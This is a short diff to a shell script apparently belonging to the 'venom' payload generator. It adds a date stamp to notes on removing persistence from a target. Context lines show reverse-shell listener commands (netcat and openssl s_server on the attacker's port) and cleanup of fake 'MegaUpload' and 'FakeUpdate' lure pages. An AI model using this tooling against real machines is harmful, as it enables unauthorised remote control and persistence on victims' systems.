@@ -12342,6 +12342,7 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    rm $IPATH/output/key.pem > /dev/nul 2>&1
 fi
 
+dtr=$(date)
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
@@ -12349,6 +12350,7 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "HANDLER: cd venom/output" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "HANDLER: sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "PERSISTENCE ID: { $random_name }" >> $IPATH/output/delete_persistence_$random_name.txt
+   echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_$random_name.txt
@@ -12544,12 +12546,14 @@ rm $IPATH/output/$Drop.zip > /dev/nul 2>&1
 rm $ApAcHe/MegaUpload.html > /dev/nul 2>&1
 rm -r $ApAcHe/FakeUpdate_files > /dev/nul 2>&1
 
+dtr=$(date)
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LHOST: $lhost" > $IPATH/output/delete_persistence_$random_name.txt
    echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "PERSISTENCE ID: { $random_name }" >> $IPATH/output/delete_persistence_$random_name.txt
+   echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "|EXECUTE THE FOLLOW COMMANDS ON TARGET CMD|" >> $IPATH/output/delete_persistence_$random_name.txt
